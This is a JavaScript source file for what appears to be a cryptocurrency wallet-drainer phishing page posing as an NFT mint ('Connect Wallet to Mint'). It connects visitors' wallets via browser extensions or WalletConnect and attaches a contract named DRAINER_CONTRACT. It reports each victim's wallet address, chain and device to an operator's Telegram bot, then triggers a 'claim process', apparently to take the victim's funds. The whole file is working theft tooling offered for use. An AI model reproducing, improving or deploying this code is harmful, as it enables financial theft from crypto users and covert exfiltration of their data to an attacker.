import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  CONSTANTS
  // ==========================================================================
  const WC_SESSION_KEY    = 'walletConnectSession';
  const WALLET_KEY        = 'connectedWallet';
  const CHAIN_TYPE_KEY    = 'chainType';
  const PENDING_URI_KEY   = 'pending_wc_uri';
  const PENDING_TS_KEY    = 'pending_wc_timestamp';
  const PENDING_TTL_MS    = 5 * 60 * 1000;
  const CONNECT_TIMEOUT   = 8000;
  const WC_APPROVAL_WAIT  = 300000;   // 5 minutes

  // ==========================================================================
  //  DEBUG PANEL
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  PLATFORM DETECTION
  // ==========================================================================
  function isMobile()  { return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); }
  function isIOS()     { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
  function isAndroid() { return /Android/i.test(navigator.userAgent); }
  function isDesktop() { return !isMobile(); }
  function isWindows() { return /Windows/i.test(navigator.userAgent); }
  function isMac()     { return /Macintosh|Mac OS X/i.test(navigator.userAgent); }

  function getPlatform() {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac())     return 'mac';
    return 'unknown';
  }

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const r = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      const result = await r.json();
      if (!r.ok) {
        console.error('[main.js] Telegram error:', result);
        return false;
      }
      return true;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }

  window.testTelegram = (m) =>
    sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  LIBRARY LOADING
  //  Only ONE WalletConnect library is loaded: EthereumProvider.
  //  It bundles SignClient + Modal internally.
  // ==========================================================================
  async function loadWalletConnectProvider() {
    const cdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];
    let EthereumProvider;

    for (const url of cdns) {
      try {
        const m = await import(url);
        EthereumProvider = m.EthereumProvider || m.default || m;
        logDebug(`✅ EthereumProvider from ${url}`);
        break;
      } catch (e) { /* try next */ }
    }
    if (!EthereumProvider) throw new Error('Could not load EthereumProvider');
    return EthereumProvider;
  }

  // ==========================================================================
  //  DOM REFERENCES
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  MODULE STATE
  // ==========================================================================
  let wcProvider       = null;   // WalletConnect EthereumProvider (single source of truth)
  let wcConnectPromise = null;   // in-flight connect promise guard
  let EthereumProvider = null;   // library class (populated on boot)

  let web3Instance     = null;
  let contractInstance = null;
  let activeProvider   = null;   // live EIP-1193 provider (injected OR WalletConnect)
  let isConnecting     = false;

  // ==========================================================================
  //  CONFIG SHORTCUTS
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
  } = CONFIG;

  let currentProjectId = PROJECT_ID;

  // ==========================================================================
  //  BUTTON UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;

    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;

    claimStatus.textContent        = msg;
    claimStatus.className          = `status ${type}`;
    claimStatus.style.display      = 'block';
    claimStatus.style.padding      = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop    = '12px';
    claimStatus.style.fontWeight   = '500';
    claimStatus.style.fontSize     = '14px';
    claimStatus.style.textAlign    = 'center';

    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  LOCAL STORAGE
  // ==========================================================================
  function saveWallet(address, session = null, chainType = null) {
    try {
      localStorage.setItem(WALLET_KEY, address);
      if (session)   localStorage.setItem(WC_SESSION_KEY, JSON.stringify(session));
      if (chainType) localStorage.setItem(CHAIN_TYPE_KEY, chainType);
    } catch (e) {
      logDebug('localStorage save failed: ' + e.message);
    }
  }

  function getSavedWallet() {
    try { return localStorage.getItem(WALLET_KEY); } catch (e) { return null; }
  }
  function getSavedSession() {
    try {
      const s = localStorage.getItem(WC_SESSION_KEY);
      return s ? JSON.parse(s) : null;
    } catch (e) { return null; }
  }
  function getSavedChainType() {
    try { return localStorage.getItem(CHAIN_TYPE_KEY) || 'unknown'; } catch (e) { return 'unknown'; }
  }

  function clearSavedWallet() {
    try {
      localStorage.removeItem(WALLET_KEY);
      localStorage.removeItem(WC_SESSION_KEY);
      localStorage.removeItem(CHAIN_TYPE_KEY);
    } catch (e) {}
  }

  function cleanupStalePendingUri() {
    try {
      const ts = sessionStorage.getItem(PENDING_TS_KEY);
      if (ts && Date.now() - parseInt(ts, 10) > PENDING_TTL_MS) {
        sessionStorage.removeItem(PENDING_URI_KEY);
        sessionStorage.removeItem(PENDING_TS_KEY);
        logDebug('Cleaned stale pending WC URI');
      }
    } catch (e) {}
  }

  // ==========================================================================
  //  GLOBAL STATE PUBLICATION
  //  The ONLY contract between main.js and script.js. `provider` is essential.
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null) {
    const live =
      provider ||
      activeProvider ||
      web3Instance?.currentProvider ||
      window.ethereum ||
      null;

    window.__apexConnected = {
      address,
      chain,
      web3:     web3Instance,
      contract: contractInstance,
      provider: live,
      session:  null,                     // session lives inside wcProvider now
      publishedAt: Date.now(),
    };

    console.log('[main.js] published window.__apexConnected', {
      address,
      chain,
      hasWeb3:     !!web3Instance,
      hasContract: !!contractInstance,
      hasProvider: !!live,
    });

    window.dispatchEvent(new CustomEvent('apex:connected', {
      detail: { address, chain },
    }));
  }

  function connectedAddress() {
    return window.__apexConnected?.address || getSavedWallet() || null;
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel  = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');

    document.getElementById('connectedAddressDisplay')?.remove();

    showStatus('Wallet disconnected', 'info');

    web3Instance     = null;
    contractInstance = null;
    activeProvider   = null;

    window.__apexConnected = null;
  }

  // ==========================================================================
  //  EIP-6963 PROVIDER DISCOVERY
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;

    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });

    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  // ==========================================================================
  //  WALLET PICKER MODAL
  // ==========================================================================
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position:fixed;inset:0;background:rgba(0,0,0,0.7);
      display:flex;align-items:center;justify-content:center;
      z-index:99999;
    `;

    const modalEl = document.createElement('div');
    modalEl.style.cssText = `
      background:#1F2937;padding:24px;border-radius:16px;
      max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;
    `;

    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;

    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);

    const list = modalEl.querySelector('#wl');

    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `
        background:#374151;border:none;padding:12px;border-radius:8px;
        color:white;font-size:16px;cursor:pointer;text-align:left;
        display:flex;gap:10px;align-items:center;
      `;

      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px';
        i.style.height = '24px';
        b.prepend(i);
      }

      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });

    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  WALLETCONNECT — SINGLE CLIENT VIA ETHEREUMPROVIDER
  // ==========================================================================

  /**
   * Get (or create) a WalletConnect EthereumProvider.
   * The provider embeds SignClient + modal, so we only need one instance.
   */
  async function getWCProvider(useTestId = false) {
    if (wcProvider) return wcProvider;

    const pid = useTestId ? PUBLIC_TEST_ID : currentProjectId;
    logDebug(`Initializing EthereumProvider (projectId=${pid.slice(0, 8)}…)`);

    wcProvider = await EthereumProvider.init({
      projectId: pid,
      chains: [1],
      optionalChains: [1],
      showQrModal: true,
      qrModalOptions: {
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '99999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
        },
      },
      methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
      events: ['chainChanged', 'accountsChanged'],
      metadata: DAPP_METADATA,
    });

    logDebug('✅ EthereumProvider initialized');
    return wcProvider;
  }

  /**
   * Connect to WalletConnect. Uses provider.connect() which:
   *   - opens the QR modal
   *   - waits for wallet approval
   *   - resolves with the accounts
   *   - wires internal event emitters
   */
  async function connectViaWalletConnect(useTestId = false, timeoutMs = WC_APPROVAL_WAIT) {
    if (isConnecting) {
      logDebug('Already connecting — returning existing promise');
      return wcConnectPromise;
    }

    isConnecting = true;

    wcConnectPromise = (async () => {
      try {
        showStatus('Opening WalletConnect…', 'info');

        const provider = await getWCProvider(useTestId);
        activeProvider = provider;
        web3Instance   = new (await import('web3')).default(provider);
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

        // The connect() call resolves only after the user approves in their wallet.
        // If the user has already authorized this dApp before, connect() resolves immediately.
        const connectPromise = provider.connect();

        const accounts = await Promise.race([
          connectPromise,
          new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs)),
        ]);

        // Some providers return void; then read accounts explicitly.
        let address = Array.isArray(accounts) ? accounts[0] : null;
        if (!address) {
          const accs = await provider.request({ method: 'eth_accounts' });
          if (accs && accs.length) address = accs[0];
        }
        if (!address) throw new Error('No accounts after connect()');

        // Save the session topic for restore. Some versions expose `.session`.
        const topic = provider.session?.topic || provider.signer?.session?.topic || null;
        if (topic) {
          saveWallet(address, { topic }, 'evm');
        } else {
          saveWallet(address, null, 'evm');
        }

        // Wire events on the provider itself (EIP-1193 style).
        provider.on('accountsChanged', (accounts) => {
          if (!accounts || !accounts.length) {
            resetConnectedUI();
            clearSavedWallet();
          } else {
            updateConnectedUI(accounts[0], 'evm');
            saveWallet(accounts[0], provider.session ? { topic: provider.session.topic } : null, 'evm');
          }
        });

        provider.on('chainChanged', (id) => {
          showStatus(`Network changed to ${id}`, 'info');
          try {
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            publishGlobalState(connectedAddress(), 'evm', provider);
          } catch (e) {}
        });

        provider.on('disconnect', () => {
          logDebug('WC provider disconnect event');
          resetConnectedUI();
          clearSavedWallet();
          wcProvider = null;
        });

        updateConnectedUI(address, 'evm');

        logDebug(`✅ WalletConnect connected: ${address}`);
        return true;
      } catch (e) {
        logDebug('WC connect failed: ' + e.message);
        return false;
      } finally {
        isConnecting = false;
        wcConnectPromise = null;
      }
    })();

    return wcConnectPromise;
  }

  // ==========================================================================
  //  CONNECT — DIRECT (INJECTED) EVM
  // ==========================================================================
  async function connectDirectEVM(timeoutMs = CONNECT_TIMEOUT) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 800));

    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return false;

    let chosen = null;
    if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info.rdns === 'io.metamask' ||
        p.info.name.toLowerCase().includes('metamask')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;

      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs)),
      ]);
      if (!accounts?.length) return false;

      const address = accounts[0];

      saveWallet(address, null, 'evm');
      setupEVMProviderEvents(provider);

      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      activeProvider = provider;

      updateConnectedUI(address, 'evm');

      logDebug(`✅ Direct EVM connected: ${address}`);
      return true;
    } catch (e) {
      logDebug('Direct EVM error: ' + e.message);
      return false;
    }
  }

  // ==========================================================================
  //  PROVIDER LIFECYCLE EVENTS (injected providers)
  // ==========================================================================
  function setupEVMProviderEvents(provider) {
    if (!provider || !provider.on) return;

    provider.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
      } else {
        updateConnectedUI(accounts[0], 'evm');
        saveWallet(accounts[0], null, 'evm');
        publishGlobalState(accounts[0], 'evm', provider);
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1000);
      }
    });

    provider.on('chainChanged', (id) => {
      showStatus(`Network changed to ${id}`, 'info');
      if (web3Instance) {
        try {
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          publishGlobalState(connectedAddress(), 'evm', provider);
        } catch (e) {}
      }
    });

    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  //  Desktop with injected wallet → injected first, WC fallback.
  //  Mobile without injected wallet → WC first.
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = false;

    const hasInjected = !!(window.ethereum || evmProviders.length > 0);
    const preferInjected = isDesktop() && hasInjected;

    if (preferInjected) {
      logDebug('Desktop + injected detected — trying injected first');
      success = await connectDirectEVM(CONNECT_TIMEOUT);
    }

    if (!success) {
      logDebug('Falling back to WalletConnect');
      success = await connectViaWalletConnect(false, WC_APPROVAL_WAIT);
    }
    if (!success) {
      logDebug('Retrying WalletConnect with test projectId');
      success = await connectViaWalletConnect(true, WC_APPROVAL_WAIT);
    }

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1500);
    } else {
      showStatus('No wallet found', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  DISCONNECT
  // ==========================================================================
  async function disconnectWallet() {
    try {
      if (wcProvider) {
        await wcProvider.disconnect();
      }
    } catch (e) {
      logDebug('disconnect error: ' + e.message);
    }

    wcProvider       = null;
    web3Instance     = null;
    contractInstance = null;
    activeProvider   = null;

    resetConnectedUI();
    clearSavedWallet();
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    const saved = getSavedWallet();
    const hasSession = wcProvider?.session || getSavedChainType() !== 'unknown';
    if (saved && hasSession) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobile()) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        if (connectButton) {
          connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
      }, 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet  = getSavedWallet();
    const savedChain   = getSavedChainType();
    const savedSession = getSavedSession();

    if (!savedWallet || savedChain !== 'evm') return;

    logDebug('Attempting session restore');

    // Attempt WalletConnect restore.
    if (savedSession && savedSession.topic) {
      try {
        const provider = await getWCProvider(false);

        // If the provider already has a session with the same topic, use it.
        const existingTopic = provider.session?.topic;
        if (existingTopic === savedSession.topic) {
          activeProvider = provider;
          web3Instance   = new (await import('web3')).default(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          updateConnectedUI(savedWallet, 'evm');
          logDebug('✅ Restored WC session from provider');
          return;
        }

        // Otherwise, try to read accounts without prompting.
        const accs = await provider.request({ method: 'eth_accounts' }).catch(() => []);
        if (accs && accs.length && accs[0].toLowerCase() === savedWallet.toLowerCase()) {
          activeProvider = provider;
          web3Instance   = new (await import('web3')).default(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          updateConnectedUI(accs[0], 'evm');
          logDebug('✅ Restored WC account from storage');
          return;
        }
      } catch (e) {
        logDebug('WC restore failed: ' + e.message);
      }
    }

    // Fall back to injected provider on desktop.
    if (isDesktop() && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0 && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
          const Web3 = (await import('web3')).default;
          web3Instance     = new Web3(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider   = window.ethereum;

          updateConnectedUI(savedWallet, 'evm');
          setupEVMProviderEvents(window.ethereum);
          return;
        }
      } catch (e) {
        // fall through
      }
    }

    // Nothing matched — clear stale state.
    logDebug('No matching session — clearing storage');
    clearSavedWallet();
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  cleanupStalePendingUri();

  try {
    EthereumProvider = await loadWalletConnectProvider();
    logDebug('✅ WalletConnect provider library loaded');

    setupEIP6963();

    // Give mobile wallets a moment to announce via EIP-6963 before restoring.
    await new Promise((r) => setTimeout(r, 600));

    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // Close the WC modal on unload to avoid a "session pending" state.
  window.addEventListener('beforeunload', () => {
    try {
      if (wcProvider?.modal) wcProvider.modal.closeModal?.();
    } catch (e) {}
  });

  logDebug(`✅ main.js ready — Platform: ${getPlatform()}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
